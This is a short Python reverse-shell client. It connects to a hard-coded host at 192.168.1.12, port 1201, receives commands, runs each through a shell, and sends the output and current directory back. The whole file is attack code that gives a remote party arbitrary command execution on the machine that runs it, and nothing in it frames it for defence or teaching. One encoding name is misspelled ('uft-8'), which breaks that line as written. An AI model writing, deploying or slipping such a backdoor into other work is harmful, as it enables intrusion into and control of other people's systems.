import socket
import os
import subprocess

s=socket.socket()
host='192.168.1.12'
port= 1201

s.connect((host,port))

while True:
    data = s.recv(1024)
    if data[:2].decode("utf-8") == "cd":
        os.chdir(data[3:].decode("utf-8"))

    if len(data) > 0:
        cmd=subprocess.Popen(data[:].decode("uft-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte=cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_byte, "utf-8")

        # Create current directory, whenever "cd" is used. 
        currentDirectory=os.getcwd() + ">"

        # Sending output command lines to the server
        s.send(str.encode(output_str + currentDirectory))

        print(output_str)